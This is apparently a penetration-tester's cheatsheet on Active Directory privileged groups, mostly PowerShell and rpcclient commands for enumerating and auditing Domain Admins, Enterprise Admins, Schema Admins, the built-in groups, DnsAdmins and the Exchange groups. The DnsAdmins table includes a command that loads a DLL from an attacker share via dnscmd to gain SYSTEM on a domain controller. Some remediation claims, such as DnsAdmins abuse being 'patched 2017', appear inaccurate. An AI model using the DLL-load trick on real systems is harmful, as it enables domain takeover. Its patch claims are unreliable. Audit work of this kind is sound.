---
aliases:
  - Built-in Groups AD
  - Domain Admins
  - Enterprise Admins
  - Tier 0 Groups
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - Groups Enumeration]]"
---
# AD - Groups Enumeration - Privileged Built-in Groups

***

## Tier 0 Domain-Level Groups

| **Group** | **RID** | **Notas** |
|:---:|:---:|:---:|
| Domain Admins | 512 | Full domain control. |
| Enterprise Admins | 519 | Forest-wide control (forest root only). |
| Schema Admins | 518 | Schema modification (forest root only). |
| Administrators (Built-in) | 544 | Per-host admins (Domain Local). |
| Account Operators | 548 | Account management. |
| Backup Operators | 551 | NTDS dump path + restore. |
| Server Operators | 549 | Logon DC, modify reg + services. |
| Print Operators | 550 | Driver install (legacy RCE). |
| Replicators | 552 | Replicate dir (legacy). |
| Domain Controllers | 516 | DC computer accounts. |
| Read-only Domain Controllers | 521 | RODC computer accounts. |
| Cloneable Domain Controllers | 522 | DC clone permission. |
| Group Policy Creator Owners | 520 | Create GPOs. |
| Pre-Windows 2000 Compatible Access | 554 | Legacy compat (anonymous SAMR). |
| Cert Publishers | 517 | ADCS adjacent. |
| Domain Guests | 514 | Default guest. |
| Domain Users | 513 | All users default group. |
| Domain Computers | 515 | All computers default group. |
^ad-priv-tier0

### Tier 0 enumeration

```powershell
# All Tier 0 groups
$tier0 = @(512, 519, 518, 544, 548, 551, 549, 550, 552, 520, 522, 517)
foreach ($rid in $tier0) {
  $sid = "$((Get-ADDomain).DomainSID.Value)-$rid"
  try {
    Get-ADGroup -Identity $sid | Select Name,SID,GroupCategory,GroupScope
  } catch {}
}

# Direct names
$tier0names = "Domain Admins","Enterprise Admins","Schema Admins","Administrators",
              "Account Operators","Backup Operators","Server Operators","Print Operators",
              "Group Policy Creator Owners","Cloneable Domain Controllers","Cert Publishers"

foreach ($g in $tier0names) {
  Write-Host "`n=== $g ===" -ForegroundColor Yellow
  Get-ADGroupMember $g -ErrorAction SilentlyContinue | Select Name,SamAccountName,ObjectClass
}
```

___

## Domain Admins (DA)

| **Detalle** | **Valor** | **Notas** |
|:---:|:---:|:---:|
| RID | 512 | Standard. |
| Scope | Global Security | Standard. |
| Default member | Administrator | Built-in. |
| Privilege | Full domain control | Top-tier. |
| Auto-added to Built-in Administrators | All DCs/hosts | Standard. |
| Recursive expansion | Often nested via groups | Audit. |
| Cross-domain DA = different per domain | Each child has own | Standard. |
| Foreign DA in privileged groups | Cross-trust risk | Audit. |
| AdminSDHolder protected | DACL re-enforced 60min | Standard. |
| Detection: bulk membership change | Defender | Adjacent. |
| Direct member non-admin = misconfig | Audit | Defender. |
| DA service account | Common misconfig | Audit. |
| DA never expire pwd | Common bad practice | Audit. |
| Unconstrained delegation users in DA | Critical risk | Audit. |
| Stale DA accounts | Spray candidates | Recon. |
| Recovery account often DA | Edge | Adjacent. |
^ad-priv-da

### DA recon

```powershell
# Direct + recursive
Get-ADGroupMember "Domain Admins" -Recursive | 
  Get-ADUser -Properties Description,LastLogonDate,PasswordLastSet,Enabled,AdminCount |
  Select Name,SamAccountName,Description,LastLogonDate,Enabled

# Service accounts in DA (audit)
Get-ADGroupMember "Domain Admins" -Recursive | 
  Get-ADUser -Properties ServicePrincipalName |
  Where ServicePrincipalName

# Stale DA
$stale = (Get-Date).AddDays(-90)
Get-ADGroupMember "Domain Admins" -Recursive | 
  Get-ADUser -Properties LastLogonDate |
  Where {$_.LastLogonDate -lt $stale}
```

___

## Enterprise Admins (EA)

| **Detalle** | **Valor** | **Notas** |
|:---:|:---:|:---:|
| RID | 519 | Standard. |
| Scope | Universal Security | Forest-wide. |
| Location | Forest root domain only | Standard. |
| Default member | Administrator (forest root) | Built-in. |
| Privilege | Forest-wide admin | Top-tier. |
| Member of Domain Admins all domains | Auto-propagated | Standard. |
| Forest takeover via EA = full forest | Critical | Standard. |
| Restricted to forest root | Cross-domain users join | Edge. |
| Empty by default in non-root | Standard | Standard. |
| Trust accounts not normally in EA | Audit | Defender. |
| Cross-trust EA | Critical exposure | Audit. |
| Universal scope = GC stored | Forest queries return | Standard. |
| EA modification = forest critical event | Defender | Adjacent. |
| Cross-domain queries via referrals | Standard | Adjacent. |
| EA stale members | High-value targets | Audit. |
| EA restricted to break-glass accounts | Best practice | Hardening. |
^ad-priv-ea

### EA recon

```powershell
# Forest root EA query
$forestRoot = (Get-ADForest).RootDomain
Get-ADGroupMember "Enterprise Admins" -Server $forestRoot -Recursive |
  Get-ADUser -Properties Description,LastLogonDate,Enabled

# Cross-domain check
$forest = Get-ADForest
foreach ($d in $forest.Domains) {
  Write-Host "`n=== $d ==="
  try { Get-ADGroupMember "Enterprise Admins" -Server $d -ErrorAction SilentlyContinue } catch {}
}
```

___

## Schema Admins

| **Detalle** | **Valor** | **Notas** |
|:---:|:---:|:---:|
| RID | 518 | Standard. |
| Scope | Universal Security | Forest-wide. |
| Location | Forest root only | Standard. |
| Default member | Administrator (forest root) | Standard. |
| Privilege | Schema modification | Forest-critical. |
| Empty typically | Best practice | Standard. |
| Schema Master FSMO | Specific DC | Adjacent. |
| Active schema mod = trigger | Edge — rare | Standard. |
| Audit: empty by default | Compliance | Defender. |
| Schema attack rare but high impact | Persistent backdoors via schema | Edge. |
| Member added = critical event | Defender SIEM alert | Adjacent. |
| Adjacent to Domain Admins | Often same person | Audit. |
| Hardening: empty + monitor add | Standard | Defense. |
| Cross-trust schema | Edge — almost never | Adjacent. |
| ms-DS-Behavior-Version control | Schema version | Standard. |
| Schema replication forest-wide | Standard | Standard. |
^ad-priv-schema

### Schema Admins audit

```powershell
$forestRoot = (Get-ADForest).RootDomain
$schemaAdmins = Get-ADGroupMember "Schema Admins" -Server $forestRoot -Recursive
if ($schemaAdmins) {
  Write-Warning "Schema Admins NOT empty:"
  $schemaAdmins | Select Name,SamAccountName
} else {
  Write-Host "Schema Admins empty (best practice)" -ForegroundColor Green
}
```

___

## Built-in Groups (Domain Local)

| **Group** | **RID** | **Privilege** |
|:---:|:---:|:---:|
| Administrators | 544 | Full local admin per-host (DC = full domain). |
| Account Operators | 548 | Account create/modify/delete (non-Tier 0). |
| Backup Operators | 551 | NTDS.dit + SAM dump access (privesc path). |
| Server Operators | 549 | Logon DC, services + reg edit (Tier 0 path). |
| Print Operators | 550 | Driver install (legacy RCE on DC). |
| Replicators | 552 | Replicate directory (legacy). |
| Power Users | 547 | Edge (local). |
| Users | 545 | Standard users. |
| Guests | 546 | Guest access. |
| Pre-Win 2000 Compat Access | 554 | Anonymous SAMR enable. |
| Remote Desktop Users | 555 | RDP access. |
| Remote Management Users | 580 | WinRM (5985/5986) access. |
| Network Configuration Operators | 556 | Network config changes. |
| Distributed COM Users | 562 | DCOM activation. |
| Performance Log Users | 559 | Performance counters. |
| Performance Monitor Users | 558 | Adjacent. |
| Cryptographic Operators | 569 | Cert services. |
| Event Log Readers | 573 | Event log access. |
| Hyper-V Administrators | 578 | Per-VM root. |
| IIS_IUSRS | 568 | IIS service accounts. |
^ad-priv-builtin

### Built-in groups enumeration

```powershell
# All built-in groups
Get-ADGroup -Filter * -SearchBase "CN=Builtin,DC=dom,DC=local" |
  Select Name,SID,GroupCategory

# Per-built-in members (all)
$builtinDN = "CN=Builtin,DC=dom,DC=local"
Get-ADGroup -Filter * -SearchBase $builtinDN | ForEach-Object {
  Write-Host "`n=== $($_.Name) ==="
  Get-ADGroupMember $_ -ErrorAction SilentlyContinue | Select Name,SamAccountName
}
```

```bash
# RPC built-in alias enum
rpcclient -U "$USER%$PASS" DC -c 'enumalsgroups builtin'
```

___

## DnsAdmins (Legacy RCE Path)

| **Detalle** | **Valor** | **Notas** |
|:---:|:---:|:---:|
| RID | Variable (custom domain RID) | Not built-in (post-2003). |
| Scope | Domain Local Security | Standard. |
| Privilege | Manage DNS service | Adjacent. |
| Legacy abuse: DLL plugin via dnscmd | Pre-CVE-2017-7299 patch | Critical privesc. |
| `dnscmd /serverlevelplugindll \\attacker\evil.dll` | Patched 2017 | Legacy. |
| Restart DNS service → DLL loaded SYSTEM | Edge | Edge. |
| Modern: requires local admin on DC | Patched | Standard. |
| Audit: empty if no specific DNS admins | Best practice | Standard. |
| Members in non-DnsAdmins context | Common audit finding | Audit. |
| Cross-correlate with privilege | Adjacent | Audit. |
| Detection: dnscmd execution | Defender | Adjacent. |
| Modern: PowerShell DNSServer module | Standard mgmt | Standard. |
| BloodHound HasSession edge | Adjacent | Adjacent. |
| Hardening: limit membership | Standard | Defense. |
| Microsoft KB on DnsAdmins privesc | Patched 2017 | Reference. |
^ad-priv-dnsadmins

### DnsAdmins audit

```powershell
# Members
Get-ADGroupMember "DnsAdmins" -Recursive | Select Name,SamAccountName,ObjectClass

# Empty by default = best practice
# Any member = potential privesc path (legacy if unpatched)
```

___

## Exchange-Related Groups (Legacy DCSync Path)

| **Group** | **Privilege** | **Notas** |
|:---:|:---:|:---:|
| Exchange Trusted Subsystem | Pre-CVE-2019-1040 had WriteDACL on domain | Patched. |
| Exchange Windows Permissions | Pre-CVE-2019-1040 had WriteDACL on domain | Patched. |
| Exchange Servers | Pre-2019 had GetChanges-style | Patched. |
| Exchange Enterprise Servers | Forest-wide adjacent | Patched. |
| ExchangeLegacyInterop | Legacy compat | Edge. |
| Compatibility Access | Edge | Edge. |
| Modern: split permission model | Defense | Standard. |
| Adjacent: Exchange Online (no on-prem) | Cloud | Adjacent. |
| Detection: Exchange ACL changes | Defender | Adjacent. |
| Audit: minimal members | Standard | Defense. |
| BloodHound Exchange edges | Modern collection | Tool. |
| Hybrid Exchange | On-prem + cloud sync | Adjacent. |
| Adjacent attack: Exchange RCE → DA | Pre-2019 chain | Critical. |
| ProxyShell / ProxyNotShell etc | Exchange specific | Adjacent. |
| Modern: Exchange Online Mgmt | Adjacent | Standard. |
| `Get-ADGroupMember "Exchange Trusted Subsystem"` | Audit | Standard. |
^ad-priv-exchange

### Exchange groups audit

```powershell
$exchangeGroups = @(
  "Exchange Trusted Subsystem",
  "Exchange Windows Permissions",
  "Exchange Servers",
  "Exchange Enterprise Servers",
  "ExchangeLegacyInterop",
  "Compatibility Access"
)

foreach ($g in $exchangeGroups) {
  Write-Host "`n=== $g ==="
  Get-ADGroupMember $g -ErrorAction SilentlyContinue -Recursive | Select Name
}
```

***
